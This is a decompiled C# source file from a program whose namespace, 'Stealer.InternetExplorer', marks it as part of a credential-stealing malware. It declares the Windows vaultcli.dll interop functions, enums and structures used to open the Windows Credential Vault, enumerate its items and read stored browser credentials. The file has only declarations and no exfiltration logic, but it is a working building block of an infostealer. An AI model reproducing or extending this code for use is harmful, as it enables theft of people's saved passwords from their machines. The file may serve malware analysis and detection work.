using System;
using System.Runtime.InteropServices;

namespace Stealer.InternetExplorer
{
	// Token: 0x02000019 RID: 25
	public static class VaultCli
	{
		// Token: 0x0600007E RID: 126
		[DllImport("vaultcli.dll")]
		public static extern int VaultOpenVault(ref Guid vaultGuid, uint offset, ref IntPtr vaultHandle);

		// Token: 0x0600007F RID: 127
		[DllImport("vaultcli.dll")]
		public static extern int VaultCloseVault(ref IntPtr vaultHandle);

		// Token: 0x06000080 RID: 128
		[DllImport("vaultcli.dll")]
		public static extern int VaultFree(ref IntPtr vaultHandle);

		// Token: 0x06000081 RID: 129
		[DllImport("vaultcli.dll")]
		public static extern int VaultEnumerateVaults(int offset, ref int vaultCount, ref IntPtr vaultGuid);

		// Token: 0x06000082 RID: 130
		[DllImport("vaultcli.dll")]
		public static extern int VaultEnumerateItems(IntPtr vaultHandle, int chunkSize, ref int vaultItemCount, ref IntPtr vaultItem);

		// Token: 0x06000083 RID: 131
		[DllImport("vaultcli.dll", EntryPoint = "VaultGetItem")]
		public static extern int VaultGetItem_WIN8(IntPtr vaultHandle, ref Guid schemaId, IntPtr pResourceElement, IntPtr pIdentityElement, IntPtr pPackageSid, IntPtr zero, int arg6, ref IntPtr passwordVaultPtr);

		// Token: 0x06000084 RID: 132
		[DllImport("vaultcli.dll", EntryPoint = "VaultGetItem")]
		public static extern int VaultGetItem_WIN7(IntPtr vaultHandle, ref Guid schemaId, IntPtr pResourceElement, IntPtr pIdentityElement, IntPtr zero, int arg5, ref IntPtr passwordVaultPtr);

		// Token: 0x020001FD RID: 509
		public enum VAULT_ELEMENT_TYPE
		{
			// Token: 0x04000935 RID: 2357
			Undefined = -1,
			// Token: 0x04000936 RID: 2358
			Boolean,
			// Token: 0x04000937 RID: 2359
			Short,
			// Token: 0x04000938 RID: 2360
			UnsignedShort,
			// Token: 0x04000939 RID: 2361
			Int,
			// Token: 0x0400093A RID: 2362
			UnsignedInt,
			// Token: 0x0400093B RID: 2363
			Double,
			// Token: 0x0400093C RID: 2364
			Guid,
			// Token: 0x0400093D RID: 2365
			String,
			// Token: 0x0400093E RID: 2366
			ByteArray,
			// Token: 0x0400093F RID: 2367
			TimeStamp,
			// Token: 0x04000940 RID: 2368
			ProtectedArray,
			// Token: 0x04000941 RID: 2369
			Attribute,
			// Token: 0x04000942 RID: 2370
			Sid,
			// Token: 0x04000943 RID: 2371
			Last
		}

		// Token: 0x020001FE RID: 510
		public enum VAULT_SCHEMA_ELEMENT_ID
		{
			// Token: 0x04000945 RID: 2373
			Illegal,
			// Token: 0x04000946 RID: 2374
			Resource,
			// Token: 0x04000947 RID: 2375
			Identity,
			// Token: 0x04000948 RID: 2376
			Authenticator,
			// Token: 0x04000949 RID: 2377
			Tag,
			// Token: 0x0400094A RID: 2378
			PackageSid,
			// Token: 0x0400094B RID: 2379
			AppStart = 100,
			// Token: 0x0400094C RID: 2380
			AppEnd = 10000
		}

		// Token: 0x020001FF RID: 511
		public struct VAULT_ITEM_WIN8
		{
			// Token: 0x0400094D RID: 2381
			public Guid SchemaId;

			// Token: 0x0400094E RID: 2382
			public IntPtr pszCredentialFriendlyName;

			// Token: 0x0400094F RID: 2383
			public IntPtr pResourceElement;

			// Token: 0x04000950 RID: 2384
			public IntPtr pIdentityElement;

			// Token: 0x04000951 RID: 2385
			public IntPtr pAuthenticatorElement;

			// Token: 0x04000952 RID: 2386
			public IntPtr pPackageSid;

			// Token: 0x04000953 RID: 2387
			public ulong LastModified;

			// Token: 0x04000954 RID: 2388
			public uint dwFlags;

			// Token: 0x04000955 RID: 2389
			public uint dwPropertiesCount;

			// Token: 0x04000956 RID: 2390
			public IntPtr pPropertyElements;
		}

		// Token: 0x02000200 RID: 512
		public struct VAULT_ITEM_WIN7
		{
			// Token: 0x04000957 RID: 2391
			public Guid SchemaId;

			// Token: 0x04000958 RID: 2392
			public IntPtr pszCredentialFriendlyName;

			// Token: 0x04000959 RID: 2393
			public IntPtr pResourceElement;

			// Token: 0x0400095A RID: 2394
			public IntPtr pIdentityElement;

			// Token: 0x0400095B RID: 2395
			public IntPtr pAuthenticatorElement;

			// Token: 0x0400095C RID: 2396
			public ulong LastModified;

			// Token: 0x0400095D RID: 2397
			public uint dwFlags;

			// Token: 0x0400095E RID: 2398
			public uint dwPropertiesCount;

			// Token: 0x0400095F RID: 2399
			public IntPtr pPropertyElements;
		}

		// Token: 0x02000201 RID: 513
		[StructLayout(LayoutKind.Explicit)]
		public struct VAULT_ITEM_ELEMENT
		{
			// Token: 0x04000960 RID: 2400
			[FieldOffset(0)]
			public VaultCli.VAULT_SCHEMA_ELEMENT_ID SchemaElementId;

			// Token: 0x04000961 RID: 2401
			[FieldOffset(8)]
			public VaultCli.VAULT_ELEMENT_TYPE Type;
		}
	}
}
